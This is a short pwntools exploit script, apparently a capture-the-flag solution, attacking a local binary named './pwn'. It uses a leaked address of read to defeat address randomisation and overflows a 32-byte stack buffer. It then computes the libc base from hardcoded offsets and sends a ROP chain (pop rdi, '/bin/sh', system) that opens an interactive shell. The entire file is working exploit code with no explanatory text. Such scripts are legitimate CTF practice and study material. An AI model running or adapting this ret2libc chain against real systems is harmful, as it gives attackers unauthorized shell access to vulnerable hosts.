from pwn import *

context(arch='amd64',os='linux',log_level='debug',endian='little')

p = process('./pwn')
# p = remote('127.0.0.1',61234)

p.recvuntil(b'use ')
read = p.recvuntil(b' with')
read = int(read[:-5],16)
p.recvuntil(b'mn!\n')

read_recall = 0x11CE + read - 0x1060
ret = 0x1236 + read - 0x1060

payload = b'a'*32 + b'a'*8 + p64(ret) + p64(read_recall)

# print('pid'+str(proc.pidof(p)))
# pause()

p.send(payload)

p.recvuntil(b'use ')
read_plt = p.recvuntil(b' with')
read_plt = int(read_plt[:-5],16)
p.recvuntil(b'mn!\n')

libc_base = read_plt - 0x1147D0
system = 0x50D70 + libc_base
binsh = 0x1D8678 + libc_base
pop_rdi = 0x2a3e5 + libc_base

payload = b'a'*32+b'a'*8+p64(pop_rdi) + p64(binsh) +p64(ret) + p64(system)
p.send(payload)

p.interactive()

# print(hex(read))